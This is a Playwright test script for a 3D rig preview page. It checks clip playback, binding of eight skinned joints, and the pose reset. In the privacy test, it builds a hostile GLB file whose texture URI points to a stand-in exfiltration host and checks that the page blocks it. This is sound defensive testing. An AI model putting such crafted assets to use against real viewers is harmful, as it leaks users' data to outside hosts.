import {chromium} from 'playwright';
import assert from 'node:assert/strict';
import {mkdirSync,writeFileSync} from 'node:fs';
const base=process.env.METAL_BOOT_BASE||'http://127.0.0.1:8765';
mkdirSync('test-results',{recursive:true});
const browser=await chromium.launch({headless:true,args:[
 '--use-gl=angle','--use-angle=swiftshader','--enable-webgl','--disable-features=Vulkan','--no-sandbox'
]});
const evidence={status:'FAIL',baseline:null,uploadedFixture:null,sourceIsActualGorillium:false,
 realGorilliumValidated:false,verifiedSite:false};
let page=null;
try{
 const ctx=await browser.newContext({viewport:{width:1180,height:760},serviceWorkers:'block'});
 await ctx.addInitScript(()=>localStorage.setItem('wir_metal_story_v1','QA_SAVED_CHAPTER_KEEP'));
 page=await ctx.newPage();
 const pageErrors=[];
 page.on('pageerror',e=>pageErrors.push(String(e.stack||e)));
 await page.goto(base+'/connected/gorillium-lab/',{waitUntil:'domcontentloaded',timeout:30000});
 await page.waitForFunction(()=>window.__gorilliumLab?.ready===true,null,{timeout:15000});
 assert.equal(await page.locator('#lash').isDisabled(),true);
 assert.equal(await page.locator('#tether').isDisabled(),true);
 await page.click('#baseline');
 await page.waitForFunction(()=>window.__gorilliumLab?.getSnapshot?.().source==='baseline-metal-s1'
  ||window.__gorilliumLab?.getSnapshot?.().error,null,{timeout:30000});
 evidence.baseline=await page.evaluate(()=>window.__gorilliumLab.getSnapshot());
 assert.equal(evidence.baseline.source,'baseline-metal-s1','Metal S1 model could not be inspected');
 assert.ok(evidence.baseline.boneCount>0,'Original S1 contains no actual rig bones');
 assert.ok(evidence.baseline.skinJointCount>0,'S1 has no skinned joints');
 assert.equal(evidence.baseline.boundCount,0);
 assert.equal(await page.locator('#lash').isDisabled(),true,'Comparison rig must not cast as Gorillium');
 console.log('BASELINE REAL-GLB RIG',JSON.stringify(evidence.baseline));
 // Exercise the newly added real embedded-clip selector and tour on known S1 fixture.
 // This proves the UI playback path, NOT Gorillium anatomy or gameplay integration.
 assert.equal(await page.locator('#clipSelect option').count(),evidence.baseline.clipCount);
 await page.locator('#clipSelect').selectOption({index:1});
 await page.locator('#playClip').click();
 const clipPreview=await page.evaluate(()=>window.__gorilliumLab.getSnapshot());
 assert.ok(clipPreview.selectedClip,'Chosen original rig clip was not selected');
 await page.locator('#playAllClips').click();
 assert.equal((await page.evaluate(()=>window.__gorilliumLab.getSnapshot())).clipTourPlaying,true);
 await page.locator('#stopClips').click();
 assert.equal((await page.evaluate(()=>window.__gorilliumLab.getSnapshot())).clipTourPlaying,false);
 evidence.clipSelectorQA={fixture:'Metal S1, not Gorillium',clipCount:evidence.baseline.clipCount,
   selectedClip:clipPreview.selectedClip,playAll:true,stop:true};

 // Privacy adversary: selected GLB embeds an external texture URL. Reject BEFORE
 // Three.js can start a request. Existing baseline must stay intact.
 const outgoing=[];
 page.on('request',req=>{if(req.url().includes('glb-exfiltration.invalid'))outgoing.push(req.url());});
 const hostileJSON=new TextEncoder().encode(JSON.stringify({
  asset:{version:'2.0'},images:[{uri:'https://glb-exfiltration.invalid/save?checkpoint=secret'}],
  meshes:[{primitives:[]}],nodes:[]
 }));
 const paddedJSON=(hostileJSON.length+3)&~3;
 const malicious=Buffer.alloc(20+paddedJSON,0x20);
 malicious.write('glTF',0,'ascii');
 malicious.writeUInt32LE(2,4);malicious.writeUInt32LE(malicious.length,8);
 malicious.writeUInt32LE(paddedJSON,12);malicious.write('JSON',16,'ascii');
 Buffer.from(hostileJSON).copy(malicious,20);
 await page.locator('#glbUpload').setInputFiles({
  name:'external-texture.glb',mimeType:'model/gltf-binary',buffer:malicious});
 await page.waitForFunction(()=>document.querySelector('#status')?.textContent?.includes('EXTERNAL_RESOURCE_BLOCKED'),
  null,{timeout:5000});
 const stillBaseline=await page.evaluate(()=>window.__gorilliumLab.getSnapshot());
 assert.equal(stillBaseline.source,'baseline-metal-s1','Bad upload erased the working original model');
 assert.equal(stillBaseline.clipCount,evidence.baseline.clipCount);
 assert.equal(outgoing.length,0,'Private GLB triggered external network requests');
 assert.equal(await page.evaluate(()=>localStorage.getItem('wir_metal_story_v1')),'QA_SAVED_CHAPTER_KEEP');
 evidence.privateGlbSafety={rejectedRemoteUri:true,requestsToExternalDomain:outgoing.length,
  baselinePreserved:true,saveUnchanged:true};
 console.log('PASS PRIVATE GLB REJECTION',JSON.stringify(evidence.privateGlbSafety));

 // Test local-file intake with the *existing Metal S1* as an explicit test fixture,
 // never label it as Gorillium. This verifies actual skinned-bone movement plumbing.
 await page.locator('#glbUpload').setInputFiles('connected/assets/models/metal/metal_phase6_fight.glb');
 await page.waitForFunction(()=>window.__gorilliumLab?.getSnapshot?.().source==='device-glb'
  ||window.__gorilliumLab?.getSnapshot?.().error,null,{timeout:30000});
 const uploaded=await page.evaluate(()=>window.__gorilliumLab.getSnapshot());
 assert.ok(uploaded.skinJointCount>=8,'Comparison GLB cannot exercise eight independently skinned bones');
 assert.equal(await page.locator('#bind').isDisabled(),false);
 const selects=page.locator('#limbMap select');
 assert.equal(await selects.count(),8);
 for(let i=0;i<8;i++)await selects.nth(i).selectOption({index:i+1});
 await page.locator('#bind').click();
 assert.equal(await page.locator('#lash').isDisabled(),false,'Eight distinct joints not bound');
 await page.locator('#lash').click();
 await page.waitForFunction(()=>window.__gorilliumLab.getSnapshot().poseDeltaRadians>.035,
  null,{timeout:1500});
 const posed=await page.evaluate(()=>window.__gorilliumLab.getSnapshot());
 assert.equal(posed.lastAbility,'tentacle-lash');
 assert.ok(posed.poseDeltaRadians>.035,'No existing skin joint actually rotated');
 // Frame-rate independent: the engine clamps dt after device backgrounding.
 // Wait for a real reset instead of assuming 550 ms wall time equals simulated time.
 await page.waitForFunction(()=>window.__gorilliumLab?.getSnapshot?.().poseDeltaRadians<.01,
  null,{timeout:10000});
 const final=await page.evaluate(()=>window.__gorilliumLab.getSnapshot());
 assert.ok(final.poseDeltaRadians<.01,'Bone did not return to original pose');
 assert.equal(await page.evaluate(()=>localStorage.getItem('wir_metal_story_v1')),'QA_SAVED_CHAPTER_KEEP');
 assert.equal(pageErrors.length,0,'Browser exceptions in preview: '+JSON.stringify(pageErrors));
 await page.screenshot({path:'test-results/gorillium-original-rig-lab.png',fullPage:true});
 evidence.uploadedFixture={name:'metal_phase6_fight.glb',classification:'S1 ONLY, NOT GORILLIUM',
  sha256:uploaded.sha256,skinJointCount:uploaded.skinJointCount,posedDelta:posed.poseDeltaRadians,
  returnedDelta:final.poseDeltaRadians,saveUnchanged:true};
 evidence.status='PASS';
 console.log('PASS GORILLIUM RIG LAB: actual Metal S1 skinned bone animated as plumbing QA (NOT GORILLIUM)',
  JSON.stringify(evidence.uploadedFixture));
}catch(e){
 evidence.error=String(e.stack||e);
 console.error('GORILLIUM RIG LAB QA FAILED',evidence.error);
 if(page){try{await page.screenshot({path:'test-results/gorillium-preview-failure.png',fullPage:true});}catch{}}
 process.exitCode=1;
}finally{
 writeFileSync('test-results/gorillium-rig-qa.json',JSON.stringify(evidence,null,2));
 await browser.close();
}